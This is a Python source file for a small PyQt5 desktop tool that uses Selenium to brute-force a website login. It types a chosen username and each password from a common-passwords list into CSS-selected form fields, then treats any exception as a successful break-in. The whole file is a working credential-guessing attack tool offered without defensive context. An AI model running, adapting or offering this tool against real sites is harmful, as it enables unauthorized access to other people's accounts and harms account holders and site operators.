from PyQt5 import QtWidgets,QtCore, QtGui, QtWidgets
from mainWindow import Ui_MainWindow
import  sys,os
from selenium import webdriver
import time


class execc:
    progress_value = 0
    stop_progress = False
    def __init__(self):
        app = QtWidgets.QApplication(sys.argv)
        MainWindow = QtWidgets.QMainWindow()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(MainWindow)
        self.ui.pushButton_2.clicked.connect(self.submit)
        self.ui.pushButton_3.clicked.connect(os._exit)
        MainWindow.show()
        sys.exit(app.exec_())

    def submit(self):
        try:

            url1 = self.ui.lineEdit.text()
            userName = self.ui.lineEdit_2.text()
            UserCSS = self.ui.lineEdit_3.text()
            PasswordCSS = self.ui.lineEdit_4.text()
            SubmitCSS = self.ui.lineEdit_6.text()
            Rate = float(self.ui.lineEdit_5.text())

            if(url1 == "" or userName == "" or UserCSS == "" or PasswordCSS == "" or Rate == ""or SubmitCSS == ""):
                print("Fill all info")
                return


            browser = webdriver.Firefox()  # Opens the Browser
            browser.get(url1)  # Open the Target url in browser

            password = open('passwords.txt')  # This text file contains most common passwords

            for pattern in password:  # Check all the patterns in password
                try:
                    userElem = browser.find_element_by_css_selector(UserCSS)  # Navigate to UserName Field
                    userElem.send_keys(userName)  # Types the Username of target
                    passElem = browser.find_element_by_css_selector(PasswordCSS)  # Navigate to Password Field
                    passElem.send_keys(pattern)  # Types pattern in password
                    submit = browser.find_element_by_css_selector(SubmitCSS)  # Navigate to Submit Button
                    submit.click()  # Click on submit button
                    time.sleep(Rate)  # Waits for page to get refresh
                except:
                    print("Successful")  # Print Success message
                    break  # Breaks the loop

            password.close()  # Close the File

        except:
            print('Please fill form Correctly')


if __name__ == "__main__":
    execc()